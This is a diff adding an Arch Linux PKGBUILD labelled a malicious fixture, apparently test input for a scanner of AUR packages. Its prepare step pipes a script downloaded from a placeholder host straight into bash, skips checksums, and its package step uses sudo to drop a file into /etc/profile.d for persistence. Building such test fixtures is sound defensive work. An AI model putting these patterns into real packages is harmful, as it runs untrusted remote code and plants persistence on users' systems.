@@ -1,0 +1,18 @@
+pkgname=aur-guard-malicious-pipe
+pkgver=1.0.0
+pkgrel=1
+pkgdesc='Malicious fixture package'
+arch=('x86_64')
+install=aur-guard-malicious-pipe.install
+source=('http://example.invalid/payload.sh' 'local.sh')
+sha256sums=('SKIP' 'SKIP')
+
+prepare() {
+  curl -fsSL https://example.invalid/payload.sh | bash
+  chmod +x local.sh
+  ./local.sh
+}
+
+package() {
+  sudo touch /etc/profile.d/aur-guard-malicious.sh
+}
